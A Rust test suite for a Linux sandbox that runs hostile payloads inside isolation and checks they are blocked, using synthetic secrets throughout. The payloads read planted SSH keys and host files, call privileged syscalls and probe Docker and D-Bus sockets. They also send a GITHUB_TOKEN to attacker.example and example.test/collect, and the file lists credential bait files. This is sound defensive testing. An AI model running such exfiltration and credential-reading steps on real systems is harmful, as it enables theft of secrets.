//! TC-020 / TC-023 / TC-024 / TC-026: hostile catalogue rows on real Linux (FR-020, FR-023,
//! FR-024, FR-026; SPEC-013). Every row is its own job; a row passes when the behaviour fails,
//! nothing outside the stage changed and the backend reports something.
//!
//! The payload is this test binary itself (`hostile_payload`, driven by `F2C_ROWS`), plus the shell
//! fixtures in `tests/fixtures/hostile/linux/`. Raw syscalls go through `syscall4`, so the tests
//! need no extra crate.
#![cfg(target_os = "linux")]
// SAFETY: the only unsafe code here is `syscall4`, which forwards four register arguments to the
// kernel and has no memory-safety preconditions of its own (callers pass plain integers).
#![allow(unsafe_code)]

mod sandbox_support;

use fail2commit_core::isolation::{
    ActivityKind, JobLimits, JobOutcome, JobSpec, JobStatus, NetworkMode,
};
use fail2commit_core::sandbox::Bubblewrap;
use sandbox_support::*;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

/// One fixture, embedded so the test binary works from a bundle.
macro_rules! fixture {
    ($name:literal) => {
        include_str!(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../tests/fixtures/hostile/linux/",
            $name
        ))
    };
}

#[test]
fn hostile_payload() {
    payload_main();
    rows_main();
}

/// A verified backend, or a printed skip (F2C_REQUIRE_SANDBOX=1 turns the skip into a failure).
fn one(test: &str) -> Option<Bubblewrap> {
    backend(Bubblewrap::default(), test)
}

/// Run this binary as the payload with `F2C_ROWS=<mode>` inside the sandbox.
fn run_rows(b: &Bubblewrap, mode: &str, env: &[(&str, &str)], limits: JobLimits) -> JobOutcome {
    run_spec(b, mode, env, limits, NetworkMode::None, false)
}

/// The same, with an explicit network mode and bait flag (FR-023, FR-024).
fn run_spec(
    b: &Bubblewrap,
    mode: &str,
    env: &[(&str, &str)],
    limits: JobLimits,
    network: NetworkMode,
    bait: bool,
) -> JobOutcome {
    let (stage, exe) = stage_self();
    let (_work, mut spec) = job(exe.to_str().unwrap(), &PAYLOAD_ARGS);
    spec.read_only = vec![stage.path().canonicalize().unwrap()];
    spec.env = vec![("PATH".into(), "/usr/bin:/bin".into())];
    for (k, v) in env {
        spec.env.push(((*k).into(), (*v).into()));
    }
    spec.env.push(("F2C_ROWS".into(), mode.into()));
    spec.limits = limits;
    spec.network = network;
    spec.bait = bait;
    fail2commit_core::sandbox::run_job(b, &spec).unwrap()
}

/// `RESULT <check> <verdict>` lines from a row payload.
fn row_results(stdout: &[u8]) -> Vec<(String, String)> {
    text(stdout)
        .lines()
        .filter_map(|l| {
            let mut it = l.strip_prefix("RESULT ")?.split(' ');
            Some((it.next()?.to_string(), it.next()?.to_string()))
        })
        .collect()
}

fn verdict(stdout: &[u8], check: &str) -> Option<String> {
    row_results(stdout)
        .into_iter()
        .find(|(c, _)| c == check)
        .map(|(_, v)| v)
}

/// Assert every named check reported `want`.
fn assert_rows(stdout: &[u8], want: &str, checks: &[&str]) {
    for c in checks {
        assert_eq!(
            verdict(stdout, c).as_deref(),
            Some(want),
            "check {c}; output:\n{}",
            text(stdout)
        );
    }
}

/// A job whose program is a shell fixture.
fn shell_job(
    script: &str,
    env: &[(&str, &str)],
    limits: JobLimits,
) -> (tempfile::TempDir, JobSpec) {
    let (_w, mut spec) = job("/bin/bash", &["-c", script]);
    for (k, v) in env {
        spec.env.push(((*k).into(), (*v).into()));
    }
    spec.limits = limits;
    let work = tempfile::tempdir().unwrap();
    let root = work.path().canonicalize().unwrap();
    spec.work_dir = root.clone();
    spec.cwd = root;
    (work, spec)
}

fn run_shell(b: &Bubblewrap, script: &str, env: &[(&str, &str)], limits: JobLimits) -> JobOutcome {
    let (_w, spec) = shell_job(script, env, limits);
    fail2commit_core::sandbox::run_job(b, &spec).unwrap()
}

/// A synthetic secret planted in a fake host home, plus a checkout to attack.
struct Planted {
    dir: tempfile::TempDir,
    home: PathBuf,
    checkout: PathBuf,
    secret: PathBuf,
}

impl Planted {
    fn new() -> Planted {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("fake-home");
        let checkout = dir.path().join("checkout");
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        std::fs::create_dir_all(&checkout).unwrap();
        let secret = home.join(".ssh/id_ed25519");
        std::fs::write(&secret, ["f2c", "synthetic", &marker()].join("-")).unwrap();
        std::fs::write(checkout.join(".env"), b"F2C_FAKE=1\n").unwrap();
        Planted {
            dir,
            home,
            checkout,
            secret,
        }
    }

    fn entries(&self) -> usize {
        std::fs::read_dir(&self.checkout).unwrap().count()
    }

    fn secret_unchanged(&self) -> bool {
        std::fs::read(&self.secret)
            .map(|b| String::from_utf8_lossy(&b).starts_with("f2c-synthetic-"))
            .unwrap_or(false)
    }

    fn env(&self) -> Vec<(String, String)> {
        vec![
            ("F2C_T_HOME".into(), self.home.display().to_string()),
            ("F2C_T_CHECKOUT".into(), self.checkout.display().to_string()),
            ("F2C_T_PLANTED".into(), self.secret.display().to_string()),
        ]
    }

    fn dir(&self) -> &Path {
        self.dir.path()
    }
}
/// Send one raw request through the egress proxy the wrapper exported.
fn proxy_request(request: &str) -> String {
    let proxy = std::env::var("HTTP_PROXY").unwrap_or_default();
    let addr = proxy.trim_start_matches("http://").to_string();
    let Ok(addr) = addr.parse() else {
        return "NOPROXY".into();
    };
    let Ok(mut s) = TcpStream::connect_timeout(&addr, Duration::from_secs(5)) else {
        return "CONNECTFAIL".into();
    };
    let _ = s.set_read_timeout(Some(Duration::from_secs(20)));
    if s.write_all(request.as_bytes()).is_err() {
        return "WRITEFAIL".into();
    }
    let mut buf = Vec::new();
    let mut chunk = [0u8; 2048];
    loop {
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                if buf.len() > 8 * 1024 {
                    break;
                }
            }
            Err(_) => break,
        }
    }
    String::from_utf8_lossy(&buf)
        .lines()
        .next()
        .unwrap_or("EMPTY")
        .to_string()
}

/// `CODE` of an HTTP status line, or the raw marker.
fn status_code(line: &str) -> String {
    line.split(' ').nth(1).unwrap_or(line).to_string()
}

/// Raw `syscall(2)` with four arguments.
#[cfg(target_arch = "x86_64")]
fn syscall4(nr: i64, a: u64, b: u64, c: u64, d: u64) -> i64 {
    let r: i64;
    // SAFETY: the kernel ABI is `rax = nr, rdi.. = args`; no memory is read or written here and
    // every caller passes plain integers.
    unsafe {
        std::arch::asm!("syscall", inlateout("rax") nr => r, in("rdi") a, in("rsi") b,
            in("rdx") c, in("r10") d, lateout("rcx") _, lateout("r11") _,
            options(nostack));
    }
    r
}

/// Raw `syscall(2)` with four arguments.
#[cfg(target_arch = "aarch64")]
fn syscall4(nr: i64, a: u64, b: u64, c: u64, d: u64) -> i64 {
    let r: i64;
    // SAFETY: the kernel ABI is `x8 = nr, x0.. = args`; no memory is read or written here and
    // every caller passes plain integers.
    unsafe {
        std::arch::asm!("svc 0", in("x8") nr, inlateout("x0") a => r, in("x1") b, in("x2") c,
            in("x3") d, options(nostack));
    }
    r
}

/// Kernel surfaces the sandbox must refuse, with each architecture's syscall number.
fn denied_syscalls() -> Vec<(&'static str, i64, [u64; 4])> {
    #[cfg(target_arch = "x86_64")]
    let t: Vec<(&str, i64, [u64; 4])> = vec![
        ("mount", 165, [0, 0, 0, 0]),
        ("umount2", 166, [0, 0, 0, 0]),
        ("unshare", 272, [0, 0, 0, 0]),
        ("setns", 308, [0, 0, 0, 0]),
        ("pivot_root", 155, [0, 0, 0, 0]),
        ("chroot", 161, [0, 0, 0, 0]),
        ("ptrace", 101, [0, 0, 0, 0]),
        ("personality", 135, [0, 0, 0, 0]),
        ("bpf", 321, [0, 0, 0, 0]),
        ("userfaultfd", 323, [0, 0, 0, 0]),
        ("perf_event_open", 298, [0, 0, 0, 0]),
        ("keyctl", 250, [0, 0, 0, 0]),
        ("add_key", 248, [0, 0, 0, 0]),
        ("io_uring_setup", 425, [0, 0, 0, 0]),
        ("kexec_load", 246, [0, 0, 0, 0]),
        ("init_module", 175, [0, 0, 0, 0]),
        ("open_by_handle_at", 304, [0, 0, 0, 0]),
        ("getpid", 39, [0, 0, 0, 0]),
    ];
    #[cfg(target_arch = "aarch64")]
    let t: Vec<(&str, i64, [u64; 4])> = vec![
        ("mount", 40, [0, 0, 0, 0]),
        ("umount2", 39, [0, 0, 0, 0]),
        ("unshare", 97, [0, 0, 0, 0]),
        ("setns", 268, [0, 0, 0, 0]),
        ("pivot_root", 41, [0, 0, 0, 0]),
        ("chroot", 51, [0, 0, 0, 0]),
        ("ptrace", 117, [0, 0, 0, 0]),
        ("personality", 92, [0, 0, 0, 0]),
        ("bpf", 280, [0, 0, 0, 0]),
        ("userfaultfd", 282, [0, 0, 0, 0]),
        ("perf_event_open", 241, [0, 0, 0, 0]),
        ("keyctl", 219, [0, 0, 0, 0]),
        ("add_key", 217, [0, 0, 0, 0]),
        ("io_uring_setup", 425, [0, 0, 0, 0]),
        ("kexec_load", 104, [0, 0, 0, 0]),
        ("init_module", 105, [0, 0, 0, 0]),
        ("open_by_handle_at", 265, [0, 0, 0, 0]),
        ("getpid", 172, [0, 0, 0, 0]),
    ];
    t
}

/// Socket families the sandbox must refuse (`socket(2)` argument).
fn socket_families() -> [(&'static str, u64); 3] {
    [("af_packet", 17), ("af_netlink", 16), ("af_vsock", 40)]
}

fn socket_syscall() -> i64 {
    #[cfg(target_arch = "x86_64")]
    {
        41
    }
    #[cfg(target_arch = "aarch64")]
    {
        198
    }
}
/// The hostile payload. Does nothing unless `F2C_ROWS` is set, so `hostile_payload` passes in a
/// normal run.
fn rows_main() {
    let Ok(mode) = std::env::var("F2C_ROWS") else {
        return;
    };
    let v = |k: &str| std::env::var(k).unwrap_or_default();
    let report = |check: &str, blocked: bool| {
        println!(
            "RESULT {check} {}",
            if blocked { "BLOCKED" } else { "ALLOWED" }
        )
    };
    match mode.as_str() {
        "files" => {
            // HB-001..008: the planted fake host home and a stand-in checkout.
            report(
                "planted_secret",
                std::fs::read(&v("F2C_T_PLANTED")).is_err(),
            );
            report("host_home", std::fs::read_dir(v("F2C_T_HOME")).is_err());
            report(
                "checkout_write",
                std::fs::write(Path::new(&v("F2C_T_CHECKOUT")).join("pwned"), b"x").is_err(),
            );
            report(
                "host_tmp",
                std::fs::write(Path::new(&v("F2C_T_HOST_TMP")).join("f2c-pwned"), b"x").is_err(),
            );
            report(
                "etc_write",
                std::fs::write(Path::new(&v("F2C_T_HOST_ETC")).join("f2c-pwned"), b"x").is_err(),
            );
            report(
                "home_dotfile",
                std::fs::write(dirs_home().join(".bashrc.f2c-pwned"), b"x").is_err(),
            );
        }
        "syscalls" => {
            for (name, nr, args) in denied_syscalls() {
                let r = syscall4(nr, args[0], args[1], args[2], args[3]);
                if name == "getpid" {
                    // Control: a call the filter allows must still work.
                    report(name, r < 0);
                    continue;
                }
                // -EPERM (or any failure) means the call did not take effect.
                report(name, r < 0);
            }
            for (name, family) in socket_families() {
                let r = syscall4(socket_syscall(), family, 3, 0, 0);
                report(name, r < 0);
            }
        }
        "listen" => {
            let tcp = std::net::TcpListener::bind(("127.0.0.1", 0));
            report("tcp_listen", tcp.is_err());
            let udp = std::net::UdpSocket::bind(("0.0.0.0", 0));
            report("udp_bind", udp.is_err());
        }
        "bait" => {
            let file = v("F2C_ROWS_FILE");
            let path = dirs_home().join(&file);
            let opened = std::fs::read(&path).is_ok();
            println!(
                "RESULT bait_open {}",
                if opened { "OPENED" } else { "REFUSED" }
            );
            // Stay alive so the watcher can stop the job (FR-024), as a real script would.
            std::thread::sleep(Duration::from_secs(5));
        }
        "proxy" => {
            let line = proxy_request(&v("F2C_ROWS_REQ"));
            println!("RESULT proxy {}", status_code(&line));
        }
        "baitproxy" | "baitpost" => {
            // HB-022 / HB-023: a bait value in a host name and in a plain-HTTP body.
            let token = std::env::var("GITHUB_TOKEN").unwrap_or_default();
            let request = if mode == "baitproxy" {
                format!("GET http://{token}.attacker.example/ HTTP/1.1\r\nHost: attacker.example\r\n\r\n")
            } else {
                let body = format!("token={token}");
                format!(
                    "POST http://example.test/collect HTTP/1.1\r\nHost: example.test\r\nContent-Length: {}\r\n\r\n{body}",
                    body.len()
                )
            };
            let line = proxy_request(&request);
            println!("RESULT proxy {}", status_code(&line));
            // Stay alive so the proxy's bait trip can stop the job (FR-024).
            std::thread::sleep(Duration::from_secs(5));
        }
        "unix" => {
            // HB-038: host sockets (approval, Docker, D-Bus) are not reachable.
            for (i, path) in v("F2C_T_UNIX").split(',').enumerate() {
                let connected = std::os::unix::net::UnixStream::connect(path).is_ok();
                println!(
                    "RESULT unix{i} {}",
                    if connected { "CONNECTED" } else { "BLOCKED" }
                );
            }
        }
        "direct" => {
            let addr = v("F2C_ROWS_ADDR");
            let target: Option<std::net::SocketAddr> = addr.parse().ok();
            let ok = target
                .and_then(|a| TcpStream::connect_timeout(&a, Duration::from_secs(3)).ok())
                .is_some();
            println!("RESULT direct {}", if ok { "CONNECTED" } else { "FAILED" });
        }
        "udp" => {
            use std::net::UdpSocket;
            let Ok(s) = UdpSocket::bind(("0.0.0.0", 0)) else {
                report("udp_public", true);
                report("udp_multicast", true);
                report("udp_broadcast", true);
                return;
            };
            let _ = s.set_write_timeout(Some(Duration::from_secs(2)));
            report("udp_public", s.send_to(b"x", "8.8.8.8:53").is_err());
            report(
                "udp_multicast",
                s.send_to(b"x", "224.0.0.251:5353").is_err(),
            );
            report(
                "udp_broadcast",
                s.send_to(b"x", "255.255.255.255:9").is_err(),
            );
        }
        "disk" => {
            // HB-053: keep writing until the meter or RLIMIT_FSIZE stops the job.
            let dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("/"));
            let blob = vec![b'x'; 64 * 1024];
            for i in 0..4000 {
                if std::fs::write(dir.join(format!("fill-{i}.bin")), &blob).is_err() {
                    break;
                }
            }
            println!("RESULT disk WROTE");
        }
        "cleanbuild" => {
            // HB-024: an ordinary build does not touch the bait.
            let dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("/"));
            let src = dir.join("build-me.c");
            std::fs::write(&src, b"int main(void){return 0;}\n").unwrap();
            let cc = std::path::Path::new("/usr/bin/cc");
            if cc.exists() {
                let _ = std::process::Command::new(cc)
                    .arg("-o")
                    .arg(dir.join("build-me"))
                    .arg(&src)
                    .status();
            }
            let _ = std::fs::read(&src);
            let _ = std::fs::read_dir(&dir).map(|d| d.count());
            println!("RESULT cleanbuild BUILT");
        }
        _ => {}
    }
}

fn dirs_home() -> PathBuf {
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("/nonexistent"))
}
// ---------------------------------------------------------------- TC-020 rows

/// TC-020-1 (HB-001..HB-008): nothing outside the stage is reachable, and nothing changes.
#[test]
fn files_outside_the_stage_are_denied() {
    let Some(b) = one("files_outside_the_stage_are_denied") else {
        return;
    };
    let planted = Planted::new();
    let mut env: Vec<(String, String)> = planted.env();
    // Stand-ins for the host's own /tmp and /etc: they exist on the host and must not exist inside
    // the sandbox. (The sandbox root is its own tmpfs, so a literal `/etc` write would only reach
    // that ephemeral root, which proves nothing about the host.)
    let host_tmp = planted.dir().join("host-tmp");
    let host_etc = planted.dir().join("host-etc");
    std::fs::create_dir(&host_tmp).unwrap();
    std::fs::create_dir(&host_etc).unwrap();
    env.push(("F2C_T_HOST_TMP".into(), host_tmp.display().to_string()));
    env.push(("F2C_T_HOST_ETC".into(), host_etc.display().to_string()));
    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    let out = run_rows(&b, "files", &env, limits());
    eprintln!("{}", text(&out.stdout));
    assert_rows(
        &out.stdout,
        "BLOCKED",
        &[
            "planted_secret",
            "host_home",
            "checkout_write",
            "host_tmp",
            "etc_write",
        ],
    );
    assert_eq!(planted.entries(), 1, "the checkout is untouched");
    assert!(
        planted.secret_unchanged(),
        "the planted secret is untouched"
    );
    assert!(
        !planted.dir().join("pwned").exists(),
        "nothing was written beside the stage"
    );
    assert_eq!(std::fs::read_dir(&host_tmp).unwrap().count(), 0);
    assert_eq!(std::fs::read_dir(&host_etc).unwrap().count(), 0);
}

/// TC-020-2 (HB-009): the host environment is not passed into the job.
#[test]
fn host_environment_secrets_are_absent() {
    let Some(b) = one("host_environment_secrets_are_absent") else {
        return;
    };
    let fake = ["f2c", "synthetic", &marker(), "token"].join("-");
    std::env::set_var("GITHUB_TOKEN", &fake);
    std::env::set_var("NPM_TOKEN", &fake);
    let out = run_shell(&b, fixture!("hb-009-env.sh"), &[], limits());
    std::env::remove_var("GITHUB_TOKEN");
    std::env::remove_var("NPM_TOKEN");
    eprintln!("{}\n{}", text(&out.stdout), text(&out.stderr));
    assert!(
        !text(&out.stdout).contains(&fake),
        "a host secret leaked in"
    );
    assert!(!text(&out.stdout).contains("GITHUB_TOKEN="));
    assert!(!text(&out.stdout).contains("NPM_TOKEN="));
}

/// TC-020-3 (HB-039): raw and netlink sockets are refused.
#[test]
fn raw_and_netlink_sockets_are_blocked() {
    let Some(b) = one("raw_and_netlink_sockets_are_blocked") else {
        return;
    };
    let out = run_rows(&b, "syscalls", &[], limits());
    eprintln!("{}", text(&out.stdout));
    assert_rows(
        &out.stdout,
        "BLOCKED",
        &["af_packet", "af_netlink", "af_vsock"],
    );
}

/// TC-020-4 (HB-040): a detached child does not outlive the job.
#[test]
fn detached_child_stops_with_the_job() {
    let Some(b) = one("detached_child_stops_with_the_job") else {
        return;
    };
    let m = marker();
    let script = format!("nohup sleep 300.{m} >/dev/null 2>&1 & echo started; exit 0");
    let out = run_shell(&b, &script, &[], limits());
    assert_eq!(out.status, JobStatus::Exited(0), "{}", text(&out.stderr));
    assert_eq!(processes_with(&m), Vec::<String>::new(), "leftovers");
}

/// TC-020-5 (HB-041): no cron entry, systemd unit or desktop autostart outside the stage.
#[test]
fn persistence_paths_are_unwritable() {
    let Some(b) = one("persistence_paths_are_unwritable") else {
        return;
    };
    let host_etc = tempfile::tempdir().unwrap();
    let host_etc_path = host_etc.path().canonicalize().unwrap();
    let out = run_shell(
        &b,
        fixture!("hb-041-persistence.sh"),
        &[("F2C_T_HOST_ETC", host_etc_path.to_str().unwrap())],
        limits(),
    );
    eprintln!("{}\n{}", text(&out.stdout), text(&out.stderr));
    let stdout = text(&out.stdout);
    for check in [
        "cron",
        "spool",
        "systemd_unit",
        "rc_local",
        "startup",
        "ld_preload",
    ] {
        assert!(
            stdout.contains(&format!("RESULT {check} BLOCKED")),
            "{check} was not blocked: {stdout}"
        );
    }
    assert_eq!(
        std::fs::read_dir(&host_etc_path).unwrap().count(),
        0,
        "the host's etc was written"
    );
    assert!(!Path::new("/etc/cron.d/f2c-pwned").exists());
    assert!(!Path::new("/var/spool/cron/f2c-pwned").exists());
}

/// TC-020-6 (HB-042..HB-044): another process of the user cannot be signalled or traced.
#[test]
fn process_control_outside_the_job_is_blocked() {
    let Some(b) = one("process_control_outside_the_job_is_blocked") else {
        return;
    };
    let mut child = std::process::Command::new("/bin/sleep")
        .arg("60")
        .spawn()
        .expect("host sleep");
    let pid = child.id().to_string();
    let out = run_rows(&b, "syscalls", &[("F2C_T_HOST_PID", &pid)], limits());
    eprintln!("{}", text(&out.stdout));
    // ptrace must be refused by the filter before any permission check runs.
    assert_rows(&out.stdout, "BLOCKED", &["ptrace"]);
    // A signal to a host pid is invisible: the sandbox has its own PID namespace.
    let alive = child.try_wait().unwrap().is_none();
    let _ = child.kill();
    let _ = child.wait();
    assert!(alive, "the host process was killed from inside the sandbox");
}

/// TC-020-7 (HB-050..HB-054): limits are enforced and reported.
#[test]
fn resource_limits_are_reported() {
    let Some(b) = one("resource_limits_are_reported") else {
        return;
    };
    // HB-053: the disk meter stops a job that writes past the limit.
    let cap = 2 * 1024 * 1024;
    let lim = JobLimits {
        disk_bytes: Some(cap),
        ..limits()
    };
    let out = run_rows(&b, "disk", &[], lim);
    eprintln!("disk status {:?}", out.status);
    assert_ne!(
        out.status,
        JobStatus::Exited(0),
        "the disk limit was not hit"
    );
    assert!(
        out.report
            .events
            .iter()
            .any(|e| e.kind == ActivityKind::Limit),
        "no limit entry: {:?}",
        out.report.events
    );
    // HB-054: output is capped and reported.
    let lim = JobLimits {
        max_output_bytes: 1000,
        ..limits()
    };
    let out = run_shell(
        &b,
        "head -c 4000000 /dev/zero; head -c 4000000 /dev/zero >&2; echo done",
        &[],
        lim,
    );
    assert!(out.truncated, "output was not capped");
    assert!(
        out.report
            .events
            .iter()
            .any(|e| e.kind == ActivityKind::Limit),
        "no limit entry for output"
    );
    // HB-052: a job that runs past the deadline is killed and reported.
    let lim = JobLimits {
        timeout: Duration::from_secs(2),
        ..limits()
    };
    let t = Instant::now();
    let out = run_shell(&b, "sleep 600", &[], lim);
    assert_eq!(out.status, JobStatus::TimedOut);
    assert!(t.elapsed() < Duration::from_secs(20));
    assert!(out
        .report
        .events
        .iter()
        .any(|e| e.kind == ActivityKind::Limit));
}

/// TC-020-8 (HB-060..HB-062): the kernel surfaces a script must not reach are refused.
#[test]
fn kernel_surfaces_are_blocked() {
    let Some(b) = one("kernel_surfaces_are_blocked") else {
        return;
    };
    let out = run_rows(&b, "syscalls", &[], limits());
    let stdout = text(&out.stdout);
    eprintln!("{stdout}");
    assert_eq!(
        verdict(&out.stdout, "getpid").as_deref(),
        Some("ALLOWED"),
        "the filter must not break ordinary calls: {stdout}"
    );
    assert_rows(
        &out.stdout,
        "BLOCKED",
        &[
            "mount",
            "umount2",
            "unshare",
            "setns",
            "pivot_root",
            "chroot",
            "ptrace",
            "personality",
            "bpf",
            "userfaultfd",
            "perf_event_open",
            "keyctl",
            "add_key",
            "io_uring_setup",
            "kexec_load",
            "init_module",
            "open_by_handle_at",
        ],
    );
}

/// TC-020-9 (HB-070): a job whose host side disappears leaves nothing behind.
#[test]
fn killed_host_side_leaves_no_processes() {
    let Some(b) = one("killed_host_side_leaves_no_processes") else {
        return;
    };
    let m = marker();
    let script = format!("sleep 300.{m} & sleep 300.{m}; exit 0");
    let lim = JobLimits {
        timeout: Duration::from_secs(1),
        ..limits()
    };
    let out = run_shell(&b, &script, &[], lim);
    assert_eq!(out.status, JobStatus::TimedOut);
    let mut gone = false;
    for _ in 0..50 {
        if processes_with(&m).is_empty() {
            gone = true;
            break;
        }
        std::thread::sleep(Duration::from_millis(100));
    }
    assert!(
        gone,
        "processes survived the kill: {:?}",
        processes_with(&m)
    );
}
// ---------------------------------------------------------------- TC-023 rows

const REGISTRY_GET: &str =
    "GET http://registry.npmjs.org/ HTTP/1.1\r\nHost: registry.npmjs.org\r\nAccept: */*\r\n\r\n";

/// The codes that mean "the proxy forwarded the request": anything but its own refusals.
fn forwarded(code: &str) -> bool {
    code.parse::<u16>()
        .map(|c| (200..400).contains(&c))
        .unwrap_or(false)
}

/// TC-023-1 (HB-030): `internet` reaches a public host and says so.
#[test]
fn internet_mode_reaches_a_public_host() {
    let Some(b) = one("internet_mode_reaches_a_public_host") else {
        return;
    };
    let out = run_spec(
        &b,
        "proxy",
        &[("F2C_ROWS_REQ", REGISTRY_GET)],
        limits(),
        NetworkMode::Internet,
        false,
    );
    eprintln!("{}\n{:?}", text(&out.stdout), out.report.events);
    assert_eq!(out.status, JobStatus::Exited(0), "{}", text(&out.stderr));
    let code = verdict(&out.stdout, "proxy").unwrap_or_default();
    if !forwarded(&code) {
        // No route from this host (offline CI): the row needs a VM with internet.
        skip(
            "internet_mode_reaches_a_public_host",
            &format!("no internet: {code}"),
        );
        return;
    }
    assert!(
        out.report
            .events
            .iter()
            .any(|e| e.kind == ActivityKind::NetAllowed && e.detail.contains("registry.npmjs.org")),
        "no net_allowed entry: {:?}",
        out.report.events
    );
}

/// TC-023-2 (HB-031): `none` has no proxy socket and no route.
#[test]
fn network_none_refuses_every_destination() {
    let Some(b) = one("network_none_refuses_every_destination") else {
        return;
    };
    let out = run_spec(
        &b,
        "proxy",
        &[("F2C_ROWS_REQ", REGISTRY_GET)],
        limits(),
        NetworkMode::None,
        false,
    );
    eprintln!("{}", text(&out.stdout));
    assert_eq!(
        verdict(&out.stdout, "proxy").as_deref(),
        Some("NOPROXY"),
        "no proxy variables may be exported in none mode"
    );
    let out = run_spec(
        &b,
        "direct",
        &[("F2C_ROWS_ADDR", "1.1.1.1:443")],
        limits(),
        NetworkMode::None,
        false,
    );
    assert_eq!(
        verdict(&out.stdout, "direct").as_deref(),
        Some("FAILED"),
        "a direct connection must have no route"
    );
}

/// TC-023-3 (HB-032..HB-035): loopback, private, metadata and link-local destinations are refused.
#[test]
fn private_and_loopback_destinations_are_refused() {
    let Some(b) = one("private_and_loopback_destinations_are_refused") else {
        return;
    };
    // A listener the test runs on the host: unreachable from the sandbox's own loopback.
    let host = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let host_port = host.local_addr().unwrap().port();
    let targets = [
        format!("127.0.0.1:{host_port}"),
        "10.1.2.3:443".to_string(),
        "172.16.0.1:443".to_string(),
        "192.168.1.10:443".to_string(),
        "100.64.0.1:443".to_string(),
        "169.254.169.254:80".to_string(),
        "[fd00:ec2::254]:80".to_string(),
        "[fe80::1]:443".to_string(),
        "[fc00::1]:443".to_string(),
        // A name that resolves to a loopback address on this host.
        "localhost:443".to_string(),
    ];
    for target in targets {
        let req = format!("CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n");
        let out = run_spec(
            &b,
            "proxy",
            &[("F2C_ROWS_REQ", &req)],
            limits(),
            NetworkMode::Internet,
            false,
        );
        eprintln!(
            "{target}: {} {:?}",
            text(&out.stdout).trim(),
            out.report.events
        );
        assert_eq!(
            verdict(&out.stdout, "proxy").as_deref(),
            Some("403"),
            "{target} was not refused"
        );
        assert!(
            out.report
                .events
                .iter()
                .any(|e| e.kind == ActivityKind::NetRefused),
            "{target} produced no net_refused entry: {:?}",
            out.report.events
        );
    }
}

/// TC-023-4 (HB-036): listening sockets are refused.
#[test]
fn listening_sockets_are_blocked() {
    let Some(b) = one("listening_sockets_are_blocked") else {
        return;
    };
    let out = run_spec(&b, "listen", &[], limits(), NetworkMode::Internet, false);
    eprintln!("{}", text(&out.stdout));
    assert_eq!(
        verdict(&out.stdout, "tcp_listen").as_deref(),
        Some("BLOCKED"),
        "listen(2) must be refused"
    );
}

/// TC-023-5 (HB-037): UDP to public, multicast and broadcast addresses fails.
#[test]
fn udp_multicast_and_broadcast_are_refused() {
    let Some(b) = one("udp_multicast_and_broadcast_are_refused") else {
        return;
    };
    let out = run_spec(&b, "udp", &[], limits(), NetworkMode::Internet, false);
    eprintln!("{}", text(&out.stdout));
    assert_rows(
        &out.stdout,
        "BLOCKED",
        &["udp_public", "udp_multicast", "udp_broadcast"],
    );
}

/// TC-023-6 (HB-038): host sockets are not reachable from a job.
#[test]
fn local_sockets_are_unreachable() {
    let Some(b) = one("local_sockets_are_unreachable") else {
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let approval = dir.path().join("approval.sock");
    let _listener = std::os::unix::net::UnixListener::bind(&approval).unwrap();
    let paths = format!(
        "{},{},/var/run/docker.sock,/run/dbus/system_bus_socket,/run/user/0/bus",
        approval.display(),
        dir.path().join("relay.sock").display()
    );
    let out = run_spec(
        &b,
        "unix",
        &[("F2C_T_UNIX", &paths)],
        limits(),
        NetworkMode::Internet,
        false,
    );
    eprintln!("{}", text(&out.stdout));
    assert_rows(
        &out.stdout,
        "BLOCKED",
        &["unix0", "unix1", "unix2", "unix3", "unix4"],
    );
}
// ---------------------------------------------------------------- TC-024 rows

/// The bait files a job gets in its fake home.
const BAIT_FILES: [&str; 7] = [
    ".npmrc",
    ".pypirc",
    ".git-credentials",
    ".config/gh/hosts.yml",
    ".aws/credentials",
    ".ssh/id_ed25519",
    ".env",
];

fn bait_finding(out: &JobOutcome) -> bool {
    fail2commit_core::sandbox::report_findings(&out.report)
        .iter()
        .any(|f| {
            f.kind == fail2commit_core::protocol::FindingKind::BaitTouched
                && f.action == fail2commit_core::protocol::FindingAction::Deny
        })
}

/// TC-024-1 (HB-020): opening the bait `~/.npmrc` stops the job and denies the install.
#[test]
fn bait_file_open_stops_the_job() {
    let Some(b) = one("bait_file_open_stops_the_job") else {
        return;
    };
    let out = run_spec(
        &b,
        "bait",
        &[("F2C_ROWS_FILE", ".npmrc")],
        limits(),
        NetworkMode::None,
        true,
    );
    eprintln!("{} {:?}", text(&out.stdout), out.report.events);
    assert_eq!(out.status, JobStatus::Killed, "the job must be stopped");
    assert!(out.report.bait_touched(), "{:?}", out.report.events);
    assert!(bait_finding(&out), "no BaitTouched denial");
    let detail = &out.report.events[0].detail;
    assert!(
        !detail.starts_with("npm_") && !detail.contains("="),
        "the bait value leaked into the report: {detail}"
    );
}

/// TC-024-2 (HB-021): every bait file is watched, not only `.npmrc`.
#[test]
fn every_bait_file_is_detected() {
    let Some(b) = one("every_bait_file_is_detected") else {
        return;
    };
    for file in BAIT_FILES {
        let out = run_spec(
            &b,
            "bait",
            &[("F2C_ROWS_FILE", file)],
            limits(),
            NetworkMode::None,
            true,
        );
        eprintln!(
            "{file}: {} {:?}",
            text(&out.stdout).trim(),
            out.report.events
        );
        assert_eq!(out.status, JobStatus::Killed, "{file} was not stopped");
        assert!(out.report.bait_touched(), "{file} produced no bait entry");
    }
}

/// TC-024-3 (HB-022): a bait value inside a proxied host name stops the job.
#[test]
fn bait_value_in_a_host_name_is_detected() {
    let Some(b) = one("bait_value_in_a_host_name_is_detected") else {
        return;
    };
    let out = run_spec(&b, "baitproxy", &[], limits(), NetworkMode::Internet, true);
    eprintln!("{} {:?}", text(&out.stdout), out.report.events);
    assert_eq!(out.status, JobStatus::Killed, "the job must be stopped");
    assert!(out.report.bait_touched(), "{:?}", out.report.events);
    assert!(bait_finding(&out));
}

